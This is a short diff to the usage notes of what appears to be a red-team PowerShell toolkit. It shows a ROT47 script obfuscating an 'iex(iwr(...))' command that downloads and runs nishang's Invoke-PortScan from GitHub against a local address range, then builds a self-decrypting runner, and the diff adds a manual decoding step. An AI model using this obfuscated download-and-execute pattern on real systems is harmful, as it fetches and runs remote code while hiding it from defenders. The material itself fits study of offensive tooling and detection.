@@ -181,6 +181,10 @@ iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/CertSi
 #Obfuscate the IEX(IWR('')) -Text 'string' and create the decryptme.ps1 that decrypt\execute the -text 'string' if executed ..
 .\Convert-ROT47.ps1 -Text "iex(iwr('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1'));Invoke-PortScan -StartAddress '192.168.1.250' -EndAddress '192.168.1.254' -ResolveHost -ScanPort" -Rot "22" -Action "decryptme" -Encrypt
 .\Decryptme.ps1
+
+[Manual] #Decrypt the IEX(IWR('')) Obfuscated string by last convertion
+# NOTE: double quotes are necessary in -Text "string" to deobfuscted correctly, because obfuscated string contains single quotes chars
+.\Convert-ROT47.ps1 -Text "!{0>!/*>=~,,(+PEE*w/D}!,~-x-+{*y'&,{&,Dy'%E+w%*w,w+~'#E&!+~w&}E%w+,{*Eiyw&E_&.'#{Cf'*,iyw&D(+G=??Q_&.'#{Cf'*,iyw& Ci,w*,Wzz*{++ =GOHDGLNDGDHKF= C[&zWzz*{++ =GOHDGLNDGDHKJ= Ch{+'`$.{^'+, Ciyw&f'*," -rot '22' -Decrypt
 ```
 
 <br />
